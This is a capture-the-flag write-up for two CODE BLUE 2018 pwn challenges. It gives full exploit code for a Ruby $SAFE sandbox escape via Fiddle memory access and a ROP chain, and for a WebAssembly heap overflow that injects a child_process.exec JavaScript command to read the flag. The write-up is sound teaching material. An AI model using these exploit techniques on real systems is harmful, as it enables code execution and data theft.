## Little Riddle (pwn)

This challenge was about bypassing `$SAFE=3` sandbox which is obsolete in Ruby
2.3 and above.

The bad news is that there are [some
restrictions](http://phrogz.net/programmingruby/taint.html) due to safe level
but there is also a good news:  
[`Fiddle::Pointer`](https://docs.ruby-lang.org/en/2.2.0/Fiddle/Pointer.html)
doesn't have any taint checking and it can be used to read and write arbitrary
memory!

Here is my exploit:  
```ruby  
libc_offset = {  
 "read" => 0xf7250,  
 "open" => 0xf7030,  
 "write" => 0xf72b0,  
 "exit" => 0x3a030,  
 "setcontext" => 0x47b75,  
 "pop_rdi_ret" => 0x21102,  
 "pop_rsi_ret" => 0x202e8,  
 "pop_rdx_ret" => 0x1150a6,  
 "ret" => 0x21103,  
 "main_arena" => 0x3c4b20  
}

# allocate a chunk  
a = Fiddle::Pointer.malloc(1)  
puts "a = 0x%x" % a.to_i

# get its arena  
arena = Fiddle::Pointer.new(a.to_i & 0xfffffffffc000000)[0, 8].unpack("Q")[0]  
puts "arena = 0x%x" % arena

# get address of main_arena  
main_arena = Fiddle::Pointer.new(arena + 0x868)[0, 8].unpack("Q")[0]  
puts "main_arena = 0x%x" % main_arena.to_i

# get libc base  
libc_base = main_arena - libc_offset["main_arena"]  
puts "libc base = 0x%x" % libc_base

# read flag  
[1].each{  
 ptr = Fiddle::Pointer.malloc(0x200, libc_base + libc_offset["setcontext"])

 payload = ""  
 payload << "/home/p31338/flag".ljust(0xa0, "\0")  
 payload << [ptr.to_i + 0xb0].pack("Q*")  # rsp  
 payload << [libc_base + libc_offset["ret"]].pack("Q") * 10  
 payload << [libc_base + libc_offset["pop_rdi_ret"], ptr.to_i].pack("Q*")  
 payload << [libc_base + libc_offset["pop_rsi_ret"], 0].pack("Q*")  
 payload << [libc_base + libc_offset["open"]].pack("Q")  
 payload << [libc_base + libc_offset["pop_rdi_ret"], 7].pack("Q*")  
 payload << [libc_base + libc_offset["pop_rsi_ret"], ptr.to_i].pack("Q*")  
 payload << [libc_base + libc_offset["pop_rdx_ret"], 0x40].pack("Q*")  
 payload << [libc_base + libc_offset["read"]].pack("Q*")  
 payload << [libc_base + libc_offset["pop_rdi_ret"], 1].pack("Q*")  
 payload << [libc_base + libc_offset["pop_rsi_ret"], ptr.to_i].pack("Q*")  
 payload << [libc_base + libc_offset["pop_rdx_ret"], 0x40].pack("Q*")  
 payload << [libc_base + libc_offset["write"]].pack("Q*")  
 payload << [libc_base + libc_offset["exit"]].pack("Q")  
 ptr[0, payload.length] = payload  
}  
GC.start  
__END__  
```

I used the second argument of `Fiddle::Pointer.malloc` to control the RIP, but
some teams simply cleared the "taint" flag of an object and pass it to
`File.open`.

Although the intended solution is to use `Fiddle` (that's why this challenge
is named "Little Riddle"), I was also interested in how Ruby's safe level can
be bypassed.  

So if you have solutions with or without `Fiddle`, I encourage you to publish
your writeup :)

## Secret Mailer Service 2.0 (pwn)

This challenge was about pwning a service which was written in C and compiled
to WebAssembly.

The source code of this challenge is available on [my
GitHub](https://github.com/Charo-IT/CTF/tree/master/2018/codeblue_quals/sms2).

There are three key points to solve this challenge.

1. Emscripten uses dlmalloc  
2. WebAssembly doesn't have readonly memory  
3. In WebAssembly, function pointer doesn't reference a location in memory

Let's look into these points.

### 1. [Emscripten uses
dlmalloc](https://github.com/kripken/emscripten/blob/3c4bc8e8ecb696e5a928bf96c59ff1a8256a9611/system/lib/dlmalloc.c)

So, if you are familiar with recent heap exploitation techniques, you will be
able to overwrite existing letters by exploiting off-by-one buffer overflow
which exists in `add_letter` function.

However, you have to keep in mind that there is [no
fastbins](https://github.com/kripken/emscripten/blob/3c4bc8e8ecb696e5a928bf96c59ff1a8256a9611/system/lib/dlmalloc.c#L2620-L2643),
and you can't allocate nor free a chunk when [its address is smaller than the
base address of heap
area](https://github.com/kripken/emscripten/blob/3c4bc8e8ecb696e5a928bf96c59ff1a8256a9611/system/lib/dlmalloc.c#L3050).

### 2. WebAssembly doesn't have readonly memory

This means that we can overwrite string constants like this:  
```c  
puts("hello world");  // => hello world  
"hello world"[0] = 'H';  
puts("hello world");  // => Hello world  
```

That is, we can run arbitrary Javascript code by overwriting the string
`"_do_post_letters()"` which is used in `seal_letters`.

```c  
if(post){  
   // emscripten_run_script is a function which executes Javascript code from
C world  
   emscripten_run_script("_do_post_letters()");  
}  
```

So our final goal is to overwrite this string.

### 3. In WebAssembly, function pointer doesn't reference a location in memory

Let's confirm this by writing some code:  
```c  
#include <stdio.h>

void foo(){  
   puts("foo");  
}

int main(){  
   void (*func)() = foo;

   printf("func = %p\n", func);  
   printf("*func = 0x%08x 0x%08x 0x%08x 0x%08x\n", *(unsigned int *)func,
*((unsigned int *)func + 1), *((unsigned int *)func + 2), *((unsigned int
*)func + 3));

   printf("\ncall func\n");  
   func();

   return 0;  
}  
```

```  
$ emcc -s WASM=1 -o test.js test.c -O0 -g  
$ node test.js  
func = 0x4  
*func = 0x00000000 0x00000000 0x00000000 0x00000000

call func  
foo  
```

`printf("func = %p\n", func)` shows `func = 0x4`, but `printf("0x%08x\n",
*(unsigned int *)func)` doesn't show anything interesting.

Then, where did the number "0x4" come from?  
The answer lies in the generated wast file:  
```  
 ;;@ test.c:14:0  
 (set_local $$14  ;; $$14 = func = 4  
  (get_local $$1)  
 )  
 (call_indirect (type $FUNCSIG$v)  
  (i32.add  
   (i32.and  
    (get_local $$14)  
    (i32.const 7)  
   )  
   (i32.const 10)  
  )  
 )  
 (set_global $STACKTOP  
  (get_local $sp)  
 )  
```

It looks like an instruction called `call_indirect` is used to call a function
via function pointer, and `(4 & 7) + 10`(=14) is passed as an arugment in this
case.

About `call_indirect`, [WebAssembly's
document](https://github.com/WebAssembly/design/blob/14c81a610ee2412df2ecaa4706de97f2f2206c21/Semantics.md#calls)
says:  
> Indirect calls to a function indicate the callee with an i32 index into a
> [table](https://github.com/WebAssembly/design/blob/14c81a610ee2412df2ecaa4706de97f2f2206c21/Semantics.md#table).

By examining the wast file again, we can confirm that there is a table of
functions, and `foo` is the 14th element!

```  
(elem (get_global $tableBase) $b0 $___stdio_close $b1 $b1 $___stdout_write
$___stdio_seek $b1  
$___stdio_write $b1 $b1 $b2 $b2 $b2 $b2 $_foo $b2 $b2 $b2)  
```

Okay, let's get back to SMS2.

Function pointer `Letter->filter` is used in `seal_letters` function:

```c  
void seal_letters(State *state, int post){  
   size_t i;  
   char *outbuf;

   for(i = 0; i < state->count; i++){  
       if(state->letters[i] != NULL && state->letters[i]->filter != NULL){  
           outbuf = malloc(state->letters[i]->length);  
           if(outbuf == NULL){  
               abort();  
           }  
           state->letters[i]->filter(outbuf, state->letters[i]->buf, state->letters[i]->length);  
           state->letters[i]->buf = outbuf;  
       }  
   }

   if(post){  
       emscripten_run_script("_do_post_letters()");  
   }  
}  
```

... and here is the wast instructions and the function table:  
```  
(drop  
(call_indirect (type $FUNCSIG$iiii)  
 (get_local $$44)  ;; arg1: outbuf  
 (get_local $$52)  ;; arg2: letter->buf  <- controllable  
 (get_local $$59)  ;; arg3: letter->length  <- controllable  
 (i32.add  
  (i32.and  
   (get_local $$43)  ;; letter->filter  <- controllable  
   (i32.const 15)  
  )  
  (i32.const 8)  
 )  
)  
)  
```  
```  
(elem (get_global $tableBase) $b0 $b0 $b0 $b0 $___stdio_close $b0 $b0 $b0 $b1
$_filter_lower  
$_filter_upper $_filter_swapcase $b1 $___stdio_read $___stdio_seek
$___stdout_write $___stdio_write $b1  
$b1 $b1 $b1 $b1 $b1 $b1)  
```  
This time, the index for `call_indirect` is calculated by `(letter->filter &
15) + 8`.  
So the functions we can call are:

* 1: `filter_lower`  
* 2: `filter_upper`  
* 3: `filter_swapcase`  
* 5: `__stdio_read`  
* 6: `__stdio_seek`  
* 7: `__stdout_write`  
* 8: `__stdio_write`

Hmm, `__stdio_read` looks interesting...  
Let's check [its
implementation](https://github.com/kripken/emscripten/blob/3c4bc8e8ecb696e5a928bf96c59ff1a8256a9611/system/lib/libc/musl/src/stdio/__stdio_read.c):  
```c  
#include "stdio_impl.h"  
#include <sys/uio.h>

size_t __stdio_read(FILE *f, unsigned char *buf, size_t len)  
{  
   struct iovec iov[2] = {  
       { .iov_base = buf, .iov_len = len - !!f->buf_size },  
       { .iov_base = f->buf, .iov_len = f->buf_size }  
   };  
   ssize_t cnt;

   cnt = syscall(SYS_readv, f->fd, iov, 2);  
   if (cnt <= 0) {  
       f->flags |= F_EOF ^ ((F_ERR^F_EOF) & cnt);  
       return cnt;  
   }  
   if (cnt <= iov[0].iov_len) return cnt;  
   cnt -= iov[0].iov_len;  
   f->rpos = f->buf;  
   f->rend = f->buf + cnt;  
   if (f->buf_size) buf[len-1] = *f->rpos++;  
   return len;  
}  
```  
Since we directly control the second and the third argument, we can use this
function as an arbitrary-write primitive.

### Exploit!

We can exploit this service in 4 steps:

1. Exploit the off-by-one buffer overflow bug and make chunks overlapping.  
2. Overwrite existing letter:  
   * `length`: `len("some Javascript code") + 1` (we need a null byte)  
   * `filter`: 5 (`__stdio_read`)  
   * `buf`: 0xff8 (address of `"_do_post_letters()"` string)  
3. Call `__stdio_read` by sealing letters, and input some Javascript code.  
4. Our code will be executed via `emscripten_run_script`.

Here is my exploit:  
```ruby  
#coding:ascii-8bit  
require "pwnlib"  # https://github.com/Charo-IT/pwnlib

remote = ARGV[0] == "r"  
if remote  
 host = "pwn1.task.ctf.codeblue.jp"  
 port = 31337  
else  
 host = "localhost"  
 port = 54321  
end

class PwnTube  
 def recv_until_prompt  
   recv_until("Select:\n")  
 end  
end

def tube  
 @tube  
end

def add_letter(size, content, to, filter)  
 tube.recv_until_prompt  
 tube.sendline("1")  
 tube.recv_until("Size:\n")  
 tube.sendline("#{size}")  
 tube.recv_until("Content:\n")  
 tube.send(content)  
 tube.recv_until("To:\n")  
 tube.send(to)  
 tube.recv_until_prompt  
 tube.sendline("#{filter}")  
end

def delete_letter(index)  
 tube.recv_until_prompt  
 tube.sendline("3")  
 tube.recv_until("Index:\n")  
 tube.sendline("#{index}")  
end

def seal_letter  
 tube.recv_until_prompt  
 tube.sendline("5")  
end

PwnTube.open(host, port){|t|  
 @tube = t

 cmd = "require('child_process').exec('cat flag',(a,b,c)=>console.log(b+c))\0"

 puts "[*] prepare"  
 add_letter(0xc, "A" * 0xb, "1" * 0x1f + "\n", 1)  
 add_letter(0xc, "B" * 0xb, "2" * 0x1f + "\n", 1)  
 delete_letter(0);

 puts "[*] overwrite chunksize"  
 add_letter(0xc, "C" * 0xb, "3" * 0x20 + "\x53", 1)

 puts "[*] overwrite existing letter"  
 payload = ""  
 payload << "A" * 0x10  
 payload << [cmd.length].pack("L")  # length  
 payload << [0xff8].pack("L")  # buf (address of "_do_post_letters()"")  
 payload << [5].pack("L")  # func (__stdio_read)  
 payload << "A" * 0x1f  
 add_letter(payload.length + 1, payload, "AAAA\n", 1)

 puts "[*] call __stdio_read"  
 tube.recv_until_prompt  
 tube.sendline("5")

 puts "[*] send command to execute"  
 tube.send(cmd)

 tube.interactive  
}  
```  

Original writeup (https://github.com/Charo-
IT/CTF/blob/master/2018/codeblue_quals/writeup.md#little-riddle-pwn).